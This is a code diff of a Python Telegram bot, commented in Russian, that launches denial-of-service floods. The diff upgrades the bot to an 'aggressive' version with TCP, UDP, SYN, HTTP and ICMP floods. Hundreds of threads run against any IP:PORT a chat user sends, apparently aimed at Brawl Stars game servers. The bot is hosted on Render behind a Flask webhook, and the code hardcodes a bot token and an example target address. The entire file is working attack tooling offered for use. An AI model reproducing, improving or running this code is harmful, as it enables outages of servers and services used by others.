@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-DDOS BOT - TCP + UDP
-ИСПРАВЛЕННАЯ ВЕРСИЯ ДЛЯ RENDER
+МАКСИМАЛЬНО АГРЕССИВНЫЙ DDOS БОТ
+ДЛЯ BRAWLS STARS - TCP + UDP + SYN + HTTP + ICMP
 """
 
 import telebot
@@ -11,45 +11,110 @@ import random
 import time
 import re
 import os
-import sys
-from flask import Flask, request, jsonify
+import struct
+from flask import Flask, request
 
 # ============ ТОКЕН ============
 BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# ============ НАСТРОЙКИ ============
-THREADS = 50  # Меньше потоков для стабильности
+# ============ АГРЕССИВНЫЕ НАСТРОЙКИ ============
+TCP_THREADS = 200
+UDP_THREADS = 200
+SYN_THREADS = 100
+HTTP_THREADS = 100
+ICMP_THREADS = 50
+
+DELAY = 0.00001  # Минимальная задержка
 active_attacks = {}
 
-print("[*] Бот запускается...", flush=True)
-
 # ============ АТАКИ ============
-def tcp_attack(ip, port, stop_flag):
+
+# TCP FLOOD - агрессивный
+def tcp_flood(ip, port, stop_flag):
     while not stop_flag.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
+            sock.settimeout(0.1)
             sock.connect((ip, port))
-            sock.send(random._urandom(512))
+            for _ in range(10):
+                sock.send(random._urandom(1024))
             sock.close()
         except:
             pass
-        time.sleep(0.01)
+        time.sleep(DELAY)
 
-def udp_attack(ip, port, stop_flag):
+# UDP FLOOD - агрессивный
+def udp_flood(ip, port, stop_flag):
     while not stop_flag.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.sendto(random._urandom(512), (ip, port))
+            for _ in range(5):
+                sock.sendto(random._urandom(1400), (ip, port))
             sock.close()
         except:
             pass
-        time.sleep(0.01)
+        time.sleep(DELAY)
+
+# SYN FLOOD - через обычные сокеты (максимально быстро)
+def syn_flood(ip, port, stop_flag):
+    while not stop_flag.is_set():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.05)
+            sock.connect_ex((ip, port))
+            sock.close()
+        except:
+            pass
+        time.sleep(0.000001)
+
+# HTTP FLOOD - быстрые запросы
+def http_flood(ip, port, stop_flag):
+    paths = ['/', '/api', '/game', '/battle', '/login', '/match', '/join']
+    while not stop_flag.is_set():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.3)
+            sock.connect((ip, port))
+            path = random.choice(paths)
+            req = f"GET {path}/{random.randint(1,99999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n"
+            sock.send(req.encode() * 3)
+            sock.close()
+        except:
+            pass
+        time.sleep(DELAY)
+
+# ICMP FLOOD
+def icmp_flood(ip, port, stop_flag):
+    while not stop_flag.is_set():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + random._urandom(1024)
+            sock.sendto(packet, (ip, 0))
+            sock.close()
+        except:
+            # Если нет root, используем UDP как замену
+            udp_flood(ip, port, stop_flag)
+        time.sleep(DELAY)
+
+# Brawl Stars специальный пакет
+def brawl_packet(ip, port, stop_flag):
+    while not stop_flag.is_set():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.2)
+            sock.connect((ip, port))
+            # Имитация Brawl Stars протокола
+            brawl_data = bytes([random.randint(0,255) for _ in range(256)])
+            sock.send(brawl_data)
+            sock.close()
+        except:
+            pass
+        time.sleep(DELAY)
 
 # ============ МЕНЕДЖЕР ============
-class AttackManager:
+class AggressiveAttack:
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port
@@ -59,20 +124,45 @@ class AttackManager:
     
     def start(self):
         self.start_time = time.time()
-        tcp_count = THREADS // 2
-        udp_count = THREADS // 2
         
-        for i in range(tcp_count):
-            t = threading.Thread(target=tcp_attack, args=(self.ip, self.port, self.stop_flag))
+        print(f"[*] Запуск агрессивной атаки на {self.ip}:{self.port}")
+        
+        # TCP потоки
+        for i in range(TCP_THREADS):
+            t = threading.Thread(target=tcp_flood, args=(self.ip, self.port, self.stop_flag))
             t.daemon = True
             self.threads.append(t)
             t.start()
         
-        for i in range(udp_count):
-            t = threading.Thread(target=udp_attack, args=(self.ip, self.port, self.stop_flag))
+        # UDP потоки
+        for i in range(UDP_THREADS):
+            t = threading.Thread(target=udp_flood, args=(self.ip, self.port, self.stop_flag))
             t.daemon = True
             self.threads.append(t)
             t.start()
+        
+        # SYN потоки
+        for i in range(SYN_THREADS):
+            t = threading.Thread(target=syn_flood, args=(self.ip, self.port, self.stop_flag))
+            t.daemon = True
+            self.threads.append(t)
+            t.start()
+        
+        # HTTP потоки
+        for i in range(HTTP_THREADS):
+            t = threading.Thread(target=http_flood, args=(self.ip, self.port, self.stop_flag))
+            t.daemon = True
+            self.threads.append(t)
+            t.start()
+        
+        # Brawl специфичные пакеты
+        for i in range(50):
+            t = threading.Thread(target=brawl_packet, args=(self.ip, self.port, self.stop_flag))
+            t.daemon = True
+            self.threads.append(t)
+            t.start()
+        
+        print(f"[+] Всего потоков: {len(self.threads)}")
     
     def stop(self):
         self.stop_flag.set()
@@ -95,23 +185,27 @@ def scan_port(ip):
     for port in ports:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
+            sock.settimeout(0.5)
             sock.connect((ip, port))
             sock.close()
             return port
         except:
             continue
-    return 80
+    return 15455
 
 # ============ КОМАНДЫ БОТА ============
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     bot.reply_to(message,
-        "💀 *DDOS BOT* 💀\n\n"
+        "💀 *AGGRESSIVE DDOS BOT* 💀\n\n"
+        "⚡ *МАКСИМАЛЬНАЯ МОЩНОСТЬ*\n"
+        f"• TCP: {TCP_THREADS} потоков\n"
+        f"• UDP: {UDP_THREADS} потоков\n"
+        f"• SYN: {SYN_THREADS} потоков\n"
+        f"• HTTP: {HTTP_THREADS} потоков\n\n"
         "📌 Отправь IP:PORT\n"
         "📝 Пример: `43.158.103.205:15455`\n\n"
-        "🛑 `stop` - остановка\n\n"
-        "🔥 TCP + UDP атаки",
+        "🛑 `stop` - остановка",
         parse_mode="Markdown")
 
 @bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
@@ -140,67 +234,56 @@ def attack_cmd(message):
     if not port:
         port = scan_port(ip)
     
-    attack = AttackManager(ip, port)
+    attack = AggressiveAttack(ip, port)
     attack.start()
     active_attacks[cid] = attack
     
     bot.reply_to(message,
-        f"💀 *АТАКА ЗАПУЩЕНА* 💀\n\n"
+        f"💀 *МАКСИМАЛЬНАЯ АТАКА ЗАПУЩЕНА* 💀\n\n"
         f"📍 `{ip}:{port}`\n"
-        f"⚡ TCP: {THREADS//2} потоков\n"
-        f"⚡ UDP: {THREADS//2} потоков\n"
+        f"⚡ TCP: {TCP_THREADS}\n"
+        f"⚡ UDP: {UDP_THREADS}\n"
+        f"⚡ SYN: {SYN_THREADS}\n"
+        f"⚡ HTTP: {HTTP_THREADS}\n"
+        f"📦 Задержка: {DELAY*1000:.3f}мс\n"
         f"🛑 *stop* - остановка",
         parse_mode="Markdown")
 
 @bot.message_handler(func=lambda m: True)
 def unknown(m):
-    bot.reply_to(m, "💀 Отправь IP:PORT\nПример: 43.158.103.205:15455\n\nstop - остановка")
+    bot.reply_to(m, "💀 Отправь IP:PORT для атаки\nПример: 43.158.103.205:15455\n\nstop - остановка")
 
 # ============ WEBHOOK ============
 @app.route(f'/webhook/{BOT_TOKEN}', methods=['POST', 'GET'])
 def webhook():
     if request.method == 'GET':
-        return 'Webhook is working! Send POST requests.', 200
-    
+        return 'Webhook is working!', 200
     try:
         update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
         bot.process_new_updates([update])
         return 'ok', 200
-    except Exception as e:
-        print(f"Webhook error: {e}", flush=True)
+    except:
         return 'error', 500
 
-@app.route('/', methods=['GET'])
+@app.route('/')
 def index():
-    return '✅ DDOS BOT IS RUNNING! Send IP:PORT to @' + (bot.get_me().username if hasattr(bot, 'get_me') else 'bot'), 200
+    return '✅ AGGRESSIVE DDOS BOT RUNNING!'
 
-@app.route('/health', methods=['GET'])
-def health():
-    return 'OK', 200
-
-# ============ ЗАПУСК ============
 if __name__ == "__main__":
-    print("=" * 50, flush=True)
-    print("DDOS BOT STARTING...", flush=True)
-    print("=" * 50, flush=True)
+    print("=" * 50)
+    print("AGGRESSIVE DDOS BOT STARTING")
+    print(f"TCP: {TCP_THREADS} | UDP: {UDP_THREADS} | SYN: {SYN_THREADS} | HTTP: {HTTP_THREADS}")
+    print("=" * 50)
     
-    # Установка вебхука
     RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://hostingj.onrender.com")
     webhook_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
     
-    print(f"[*] Render URL: {RENDER_URL}", flush=True)
-    print(f"[*] Webhook URL: {webhook_url}", flush=True)
-    
     try:
         bot.remove_webhook()
-        print("[*] Webhook removed", flush=True)
         bot.set_webhook(url=webhook_url)
-        print(f"[+] Webhook set to {webhook_url}", flush=True)
+        print(f"[+] Webhook: {webhook_url}")
     except Exception as e:
-        print(f"[!] Webhook error: {e}", flush=True)
+        print(f"[!] Error: {e}")
     
     port = int(os.environ.get("PORT", 8080))
-    print(f"[*] Starting Flask on port {port}...", flush=True)
-    
-    # Запуск Flask без debug (важно для Render)
-    app.run(host="0.0.0.0", port=port, debug=False, threaded=True) 
+    app.run(host="0.0.0.0", port=port, debug=False) 
